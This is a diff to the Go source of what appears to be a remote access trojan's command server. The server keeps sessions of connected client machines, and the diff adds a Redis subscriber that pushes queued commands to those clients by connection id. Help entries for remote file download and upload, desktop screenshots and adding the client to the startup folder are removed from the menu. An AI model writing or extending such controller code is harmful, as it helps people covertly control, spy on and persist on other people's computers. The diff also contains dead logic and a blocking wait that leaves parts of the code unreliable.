@@ -9,8 +9,9 @@ import (
     "os"
     "strconv"
     "sync"
-    "time"
+    "encoding/json"
     "github.com/mxi4oyu/MoonSocket/protocol"
+    "github.com/gomodule/redigo/redis"
 )
 
 const (
@@ -31,14 +32,8 @@ var (
     connlist        map[int]net.Conn = make(map[int]net.Conn) //存储所有连接的会话
     connlistIPAddr  map[int]string   = make(map[int]string)   //存储所有IP地址，提供输入标识符显示
     lock                             = &sync.Mutex{}
-    downloadOutName string
+    cmdinfo = make(map[string]string)
 )
-
-func getDateTime() string {
-    currentTime := time.Now()
-    // https://golang.org/pkg/time/#example_Time_Format
-    return currentTime.Format("2006-01-02-15-04-05")
-}
 
 // ReadLine 函数等待命令行输入,返回字符串
 func ReadLine() string {
@@ -55,7 +50,6 @@ func connection(conn net.Conn) {
     defer conn.Close()
     var myid int
     myip := conn.RemoteAddr().String()
-
     lock.Lock()
     counter++
     myid = counter
@@ -107,9 +101,68 @@ func handleConnWait() {
     }
 }
 
+// redis初始化连接
+func newRedisclient() (conn redis.Conn, err error) {
+    host := "127.0.0.1"
+    port := "6379"
+    adderss := host + ":" + port
+    c, err := redis.Dial("tcp", adderss)
+    return c, err
+}
+
+//订阅redis
+func resolveOrderCreate(wait *sync.WaitGroup)  {
+    defer wait.Done()
+    conn, err := newRedisclient()
+    if err != nil {
+        return
+    }
+    client := redis.PubSubConn{conn}
+    err = client.Subscribe("order-create")
+    if err != nil {
+        fmt.Println("订阅错误:", err)
+        return
+    }
+    fmt.Println("等待订阅数据 ---->")
+    for {
+        switch v := client.Receive().(type){
+        case redis.Message:
+            //fmt.Printf("收到来自%s订阅消息:%s", v.Channel, string(v.Data))
+            handleRedisMsg(string(v.Data))
+        case redis.Subscription:
+            fmt.Println("Subscription", v.Channel, v.Kind, v.Count)
+        }
+    }
+}
+
+func handleRedisMsg(info string){
+    err:= json.Unmarshal([]byte(info), &cmdinfo)
+    if err != nil {
+        fmt.Println("string转map失败",err)
+    }else {
+        fmt.Println(cmdinfo)
+        for key,value := range cmdinfo{
+            connid,_ := strconv.Atoi(key)
+            if value != "" {
+                var e error
+                if e != nil {
+                } else if _, ok := connlist[connid]; ok {
+                    sendMsgToClient(connlist[connid],value)
+                }
+            }
+
+        }
+    }
+
+}
+
 func main() {
     flag.Parse()
     go handleConnWait()
+    var wg sync.WaitGroup
+    wg.Add(1)
+    go resolveOrderCreate(&wg)
+    wg.Wait()
     connid := 0
     for {
         fmt.Print(RED, "SESSION ", connlistIPAddr[connid], WHITE, "> ")
@@ -120,15 +173,10 @@ func main() {
             // 如果输入为空，则什么都不做
         case "help":
             fmt.Println("")
-            fmt.Println(CYAN, "COMMANDS              DESCRIPTION")
             fmt.Println(CYAN, "-------------------------------------------------------")
             fmt.Println(CYAN, "session             选择在线的客户端")
-            fmt.Println(CYAN, "download            下载远程文件")
-            fmt.Println(CYAN, "upload              上传本地文件")
-            fmt.Println(CYAN, "screenshot          远程桌面截图")
             fmt.Println(CYAN, "exit                客户端下线")
             fmt.Println(CYAN, "quit                退出服务器端")
-            fmt.Println(CYAN, "startup             加入启动项目文件夹")
             fmt.Println(CYAN, "-------------------------------------------------------")
             fmt.Println("")
         case "session":
